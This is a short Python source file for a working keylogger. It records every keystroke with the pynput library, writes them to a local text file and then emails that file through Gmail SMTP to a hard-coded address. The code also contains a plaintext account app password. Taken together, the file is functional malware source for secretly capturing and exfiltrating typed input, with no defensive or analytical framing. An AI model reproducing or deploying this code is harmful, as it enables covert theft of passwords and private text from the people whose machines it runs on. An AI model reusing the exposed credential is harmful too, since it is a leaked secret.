import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
import datetime

def keyPressed(key):
    try:
        char = key.char
        if char is not None: 
            print(char, end='', flush=True)  
            with open("keyfile.txt", 'a') as logKey:
                logKey.write(char)
    except AttributeError:
        print(f"[{key}]", end='', flush=True)  
        with open("keyfile.txt", 'a') as logKey:
            logKey.write(f"[{key}]")
        if key == keyboard.Key.esc:
            print("escape pressed, exiting...")
            return False
        
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()  
    
email = "alternativeac128@gmail.com"
receiver_email = "alternativeac128@gmail.com"
subject = "keylogger"
message = str(datetime.datetime.now())
file_path = r"C:\Users\jef\Desktop\shortcuts\keyloggerproject\keyfile.txt" 

msg = MIMEMultipart()
msg['From'] = email
msg['To'] = receiver_email
msg['Subject'] = subject

msg.attach(MIMEText(message, 'plain'))

try:
    with open(file_path, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part) 
        part.add_header('Content-Disposition', f'attachment; filename={file_path.split("/")[-1]}')
        msg.attach(part)  
except Exception as e:
    print(f"Error reading file: {e}")

text = msg.as_string()

try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()  
    server.login(email, "ivmw ifcc yhdy eekf")  
    server.sendmail(email, receiver_email, text)
    print("Email has been sent to " + receiver_email)
except Exception as e:
    print(f"Error: {e}")
finally:
    server.quit()  

#source
# https://www.youtube.com/watch?v=mDY3v2Xx-Q4 pynput library
# https://www.youtube.com/watch?v=JRCJ6RtE3xU smtp
